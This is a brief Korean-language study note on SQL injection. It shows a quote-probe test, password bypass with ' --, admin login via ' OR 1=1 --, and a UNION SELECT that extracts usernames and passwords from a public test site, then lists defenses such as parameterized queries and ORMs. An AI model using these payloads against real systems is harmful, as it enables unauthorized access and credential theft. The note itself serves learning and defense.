...
1. 아이디 뒤에' 입력해보기    => 원래 틀렸습니다. 유효하지 않습니다 뜨던 화면이 [object Object]라는 화면 뜨면 sqlInjection 으로 해킹하기 쉬운 사이트
why?   보통 아이디 비번이 확인하는 쿼리가 WHERE ID = '유저가 입력한아이디' AND PW = '유저가 입력한PW'  로 짜기 때문.
2. 강제로그인 해보기
아이디에 존재하는아이디' --     로 입력해보기.    그러면 SELECT * FROM MEMBER WHERE ID = 'test' -- ' and pw='유저가입력한pw'   가 되므로 뒤가 전부 주석처리되어서 pw없이 아이디만으로 로그인됨
3. admin권한으로 로그인해보기
아이디에 존재하는 아이디' OR 1=1 --   로 입력해보기
SELECT * FROM MEMBER WHERE ID = 'test' OR 1=1 -- AND PW = '유저가입력한pw'    가 되므로 보통 맨위의 행은 처음에 만든 admin일 가능성이 높기 때문에
4. 다른테이블의 내용 출력
파라미터로 올바른 값이 아니라 sql문법을 입력
예를 들어서 testphp.vulnweb.com/artists.php?artist = -1 UNION SELECT 1, UNAME, PASS FROM USERS WHERE UNAME = 'test'
그러면 백단에서 실행하는 쿼리는 SELECT * FROM 어쩌구 WHERE ARTIST = -1 UNION SELECT 1, UNAME, PASS FROM USERS WHERE UNAME = 'test'가 된다.
5. 예방법
  1. parameterized query : 유저가 입력한 값을 문자열로 더하지말고 파라미터로 안전하게 받기
  2. stored procedure
  3. orm
  4. 특수기호 미리 거르기
